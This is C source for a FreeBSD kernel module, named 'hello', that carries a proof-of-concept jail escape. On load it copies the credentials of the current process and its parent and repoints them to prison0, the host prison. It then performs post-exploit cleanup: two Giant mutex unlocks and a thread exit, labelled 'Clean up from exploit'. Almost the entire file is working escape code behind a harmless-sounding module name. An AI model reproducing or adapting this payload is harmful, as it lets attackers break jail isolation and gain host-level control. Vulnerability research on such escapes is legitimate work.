#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>   /* printf */
#include <sys/proc.h>
#include <sys/jail.h>
#include <sys/ucred.h>
#include <sys/mutex.h>

extern struct mtx Giant;
extern struct prison prison0;

void poc_unjail_current_process(void);
void poc_unjail_parent_process(void);

void
poc_unjail_current_process(void)
{
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct ucred  *oldcr, *newcr;

    PROC_LOCK(p);

    oldcr = td->td_ucred;

    printf("poc_unjail_current_process: 1\n");
    /* duplicate creds (also copies refcounts for groups, etc.) */
    newcr = crdup(oldcr);

    printf("poc_unjail_current_process: 2\n");
    /* bump refcount on prison0 for safety */
    prison_hold(&prison0);
    newcr->cr_prison = &prison0;

    /* point both thread + proc to new creds */
    td->td_ucred = newcr;
    p->p_ucred   = newcr;

    printf("poc_unjail_current_process: 3\n");
    PROC_UNLOCK(p);

    printf("poc_unjail_current_process: 4\n");
    /* drop old cred */
    crfree(oldcr);

    printf("poc_unjail_current_process: 5\n");
}

void
poc_unjail_parent_process(void)
{
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct proc   *pp;
    struct ucred  *oldcr, *newcr;

    printf("poc_unjail_parent_process: 1\n");
    PROC_LOCK(p);
    pp = p->p_pptr;
    if (pp == NULL) {
        printf("poc_unjail_parent_process: 1a\n");
        PROC_UNLOCK(p);
        return;
    }
    printf("poc_unjail_parent_process: 2\n");
    PROC_LOCK(pp);
    printf("poc_unjail_parent_process: 3\n");
    PROC_UNLOCK(p);   /* don't hold both longer than needed */

    oldcr = pp->p_ucred;
    printf("poc_unjail_parent_process: 4\n");
    newcr = crdup(oldcr);

    printf("poc_unjail_parent_process: 5\n");
    prison_hold(&prison0);
    newcr->cr_prison = &prison0;

    /* set process cred */
    pp->p_ucred = newcr;

    /* set each thread's cred (for stuff that looks at td_ucred) */
    struct thread *td2;
    printf("poc_unjail_parent_process: 6\n");
    FOREACH_THREAD_IN_PROC(pp, td2) {
        printf("poc_unjail_parent_process: 6a\n");
        td2->td_ucred = newcr;
    }

    printf("poc_unjail_parent_process: 7\n");
    PROC_UNLOCK(pp);

    printf("poc_unjail_parent_process: 8\n");
    crfree(oldcr);
    printf("poc_unjail_parent_process: 9\n");
}

/*
 * Event handler for the module.
 */
static int
hello_modevent(module_t mod __unused, int event, void *arg __unused)
{
    switch (event) {
    case MOD_LOAD:
        printf("hello: Hello, kernel world!\n");

        printf("begin: poc_unjail_current_process()\n");
        poc_unjail_current_process();
        printf("end: poc_unjail_current_process()\n");

        printf("begin: poc_unjail_parent_process()\n");
        poc_unjail_parent_process();
        printf("end: poc_unjail_parent_process()\n");

        // Clean up from exploit
        printf("begin 1: mtx_unlock() address: %p\n", &Giant);
        mtx_unlock(&Giant);
        printf("end 1: mtx_unlock()\n");

        printf("begin 2: mtx_unlock() address: %p\n", &Giant);
        mtx_unlock(&Giant);
        printf("end 2: mtx_unlock()\n");

        struct thread *td = curthread;
        struct proc *p = td->td_proc;

        printf("begin: PROC_LOCK()\n");
        PROC_LOCK(p);
        printf("end: PROC_LOCK()\n");

        printf("begin: thread_exit()\n");
        thread_exit();
        printf("end: thread_exit()\n");
        break;
    case MOD_UNLOAD:
        printf("hello: Goodbye, kernel world!\n");
        break;
    default:
        return (EOPNOTSUPP);
    }

    return (0);
}

static moduledata_t hello_mod = {
    "hello",            /* module name */
    hello_modevent,     /* event handler */
    NULL                /* extra data */
};

DECLARE_MODULE(hello, hello_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
MODULE_VERSION(hello, 1);
